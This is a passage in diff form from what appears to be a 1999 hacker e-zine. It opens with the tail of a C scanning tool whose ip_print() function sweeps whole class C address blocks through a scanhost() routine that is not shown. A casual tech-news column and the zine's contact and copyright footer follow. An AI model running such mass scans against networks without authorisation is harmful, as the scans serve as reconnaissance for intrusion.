+        }
+        
+        nlo = count / 2;
+        lo = list;
+        nhi = count - nlo;  
+        hi = list + nlo;
+        if (nlo > 1)
+                ip_sort(lo, nlo, temp);
+        if (nhi > 1)             
+                ip_sort(hi, nhi, temp);
+        
+        t = temp;
+        
+        while (nlo && nhi)  
+                if (*lo <= *hi)
+                        *t++ = *lo++, --nlo;
+                else
+                        *t++ = *hi++, --nhi;
+        while (nlo--)            
+                *t++ = *lo++;
+        
+        for (lo = list, nlo = count - nhi, t = temp; nlo; --nlo)
+                *lo++ = *t++;
+}
+                
+void ip_print() {
+        struct in_addr in;
+        u_long n;
+        int x;
+        if(iplist_count==0) printf("Somehow, query refused: no host to scan.\n");
+        for (n = 0; n < iplist_count; n++) {
+                in.s_addr = htonl(*(u_long *)(iplist_ptr + (n * 4)));
+                if (allclassc) {
+                        for (x = 0; x <= 255; x++) {
+scanhost(1,inet_ntoa(in),fichierb,fichierlogb);
+                                in.s_addr = htonl(htonl(in.s_addr) + 1);
+                        } 
+                } else {
+scanhost(1,inet_ntoa(in),fichierb,fichierlogb);
+}       
+ }
+        fflush(stdout);
+}
+
+/***********************************************************************/
+/* END OF THE lameo++ rip of adm code to do a ns query (z0ne.c like does
+/10000* more work normally so get it...                                 */
+/***********************************************************************/
+
+	|----------------------------> c0de st4wpz h3r3 <----------------------------|
+
+
+
+
+ _________________________________________________________
+|----------> h1p h4pp3n1ngz - NEWS by discore ----------- |->
+ ¯¯¯¯¯¯¯¯¯¯¯¯¯¯¯¯¯¯¯¯¯¯¯¯¯¯¯¯¯¯¯¯¯¯¯¯¯¯¯¯¯¯¯¯¯¯¯¯¯¯¯¯¯¯¯¯¯
+
+Well. Since I'm a regular slashdot reader, and we are dying for content, I thought I'd 
+throw together a nifty news section.  Oh, by the way, this isn't exactly the "0-day shit" 
+you normally find here. Some of this news may be somewhat old (a month or two) but don't 
+worry its still good news.
+
+Gaming News:
+
+An interesting article on how video games are no longer just toys, but extremly common 
+household appliances. Although it is named "War for your thumbs" it isn't very war-like. I
+t talks about the next wave of console gaming systems. Makes good points on the technology 
+aspect of things. Give it a read, it's pretty informative:
+http://www.salon.com/tech/feature/1999/10/21/console_wars/index.html
+
+And, of course, I have to plug the guys at Nintendo because they kick ass. Hopefully their 
+next "Second Generation" system, that is now code named "Dolphin" will be release sometime 
+in the 4th quarter of 1900 (heh). They have released a few very impressive specs on it at:
+http://www.nintendo.com/corp/press/0910d99.html
+
+Those crazy Japs are at it again. I seriously don't understand this Pokemon craze. Then 
+again the last craze I understood was Pogs, because those just kicked ass. I guess some 
+parent's thought Pokemon was a little too gambling intensive for their children, and what 
+the most logical thing to do in a situation like that? Sue the hell out of the maker of 
+course. You can read about this whole ordeal here:
+http://www.nypost.com/news/14579.htm
+
+A couple weeks later on slashdot, it was posted that some of the lawyers on the family's 
+side were also contracted with Nintendo as lawyers. Obviously this is proof that all lawyers 
+suck. This article has been removed from "San Diego Online's" website. I'm sure we are all 
+starting to understand that all gaming systems are monopolized by the NSA. The NSA is like 
+fucking with everyone, as usual.
+
+NSA News:
+
+Speaking of the NSA! It is now time for the NSA news. As some of you may have heard, 
+there is a god. God's name isn't god though, it is called Echelon. If you have no idea 
+what Echelon is I invite you to read a very informative article at:
+http://camarilla.hektik.org/nsa/
+
+Now if you do know what Echelon is then you are scared. That is normal. There was a 
+"Jam Echelon Day" on October 21st. You can read a bit about that, thanks to the great 
+people at Wired (one of the four magazines i subscribe too!) here:
+http://www.wired.com/news/politics/0,1283,31726,00.html
+
+The success of the project is, of course, unknown. This is partly due to the fact that 
+no one is able to prove that such a system like Echelon exists. Although those 
+low-budget-humor Segfault folks have boasted that the NSA was up to its knees in 
+shit on the 21st. If you want to read about that check it here:
+http://segfault.org/story.phtml?mode=2&id=38109361-08119920
+
+Script Kiddie News:
+
+C-Net has a neat article on the "Top 10 Hacks" of the computer era. Of course your opinion 
+may not agree with the ten hacks they selected. They are journalistic bastards who try to 
+make really lame things sound really cool. Deal with it. You can deal with it at:
+http://home.cnet.com/specialreports/0-6014-7-1420567.html?tag=st.cn.1fd2.tlpg.6014-7-1420567
+
+Steven Levy has written a very good book called Hackers: Heros of the Computer Revolution. 
+This is a very good book because it doesn't talk about anything lame. It includes a history 
+of hacking in its core essence. A hacker isn't what the media makes one out to be. This 
+book explains hackers in a very deep way. It covers the open source movement, Security 
+ideas and applications and that whole Linux thing. If you would like a review of the 
+book go here:
+http://slashdot.org/article.pl?sid=99/10/18/1059257&mode=thread
+
+And if you would like to purchase it go here:
+http://www.amazon.com/exec/obidos/ISBN%3D0385312105/slashdotorg0f/002-4132595-4261011
+
+Really Fast Computers News:
+
+Well if you haven't heard about these two items then you must live in Wyoming or 
+something. AMD has released a 700 Mhz CPU, called the Athlon. You may phear it here:
+http://news.cnet.com/news/0-1006-200-429540.html?tag=st.ne.1002.tgif?st.ne.fd.gif.d
+
+And those crazy Intel kids have whipped up a 733Mhz CPU of their own. You may phear this at:
+http://www.intel.com/PentiumIII/18.htm?iid=feature+P3P2&
+
+Intel also has plans to release a 1100Mhz CPU in December. Details are sketchy, but as 
+of now this processor will only work if installed in a freezer. You can go read about this here:
+http://www.theregister.co.uk/991018-000020.html
+
+United States News (aka "The big nation that takes everyones money"):
+
+Appearently it is now illegal to register, lets say, clinton-house-of-porn.com and then 
+when Clinton decides to open his house of porn you sell him the domain for 1 trillion yen. 
+This used to be somewhat profitable, but now you'll get sued. Isn't America great? Go read 
+about how great we are here:
+http://www.cnn.com/ALLPOLITICS/stories/1999/10/27/cybersquat.ap/index.html
+
+As if dialup users weren't getting fucked over enough simply by being on that slow of a 
+connection, it is somewhat rumored that the US is going to put together a nifty "modem tax." 
+If the head "are we making money?" guys in Washington had a clue they would have realized, 
+firstly, that they suck, and secondly, that this would have been much more profitable about 
+3 years ago. Dial users, go read about your fate here:
+http://www.zdnet.com/zdnn/stories/news/0,4586,2376030,00.html?chkpt=hpqsnewstest
+
+Well that's it for me. I hope you found my news funny, yet informative. I do accept donations
+of computers parts or money if you feel you would like to get rid of any.
+
+-- discore (tyler@enjoy-unix.org)
+
+
+
+
+ _________________________________________________________
+|----------> Submissions and Contacts!@#%! -------------- |->
+ ¯¯¯¯¯¯¯¯¯¯¯¯¯¯¯¯¯¯¯¯¯¯¯¯¯¯¯¯¯¯¯¯¯¯¯¯¯¯¯¯¯¯¯¯¯¯¯¯¯¯¯¯¯¯¯¯¯
+   Website			- http://camarilla.hektik.org/
+   Questions? Comments? - zine@camarilla.hektik.org
+   Article Submissions  - articles@camarilla.hektik.org
+   Voice Mail Box       - 888.835.3268 extension: 431337
+
+   official distro sites:
+	- http://www.stupidphat.com
+	- http://www.telehack.net
+	- http://www.hektik.com
+
+   offical mirrors:
+	- http://www.hektik.org/camarilla/
+	 ____________________________
+	| © Copyright Camarilla, 1999| 
+	 ¯¯¯¯¯¯¯¯¯¯¯¯¯¯¯¯¯¯¯¯¯¯¯¯¯¯¯¯
+		[ we work hard to distribute this for free! ] 
+		[  so please don't plagiarize our work  ;)  ]
+
+		
+	============================================================
+	= Is this copy of Camarilla Skunked?
+	= If this file isn't 80,415 bytes than this issue
+	= has been messed with! get a fresh copy from our site:
+	= http://camarilla.hektik.org/
+	============================================================
+
+EOF 
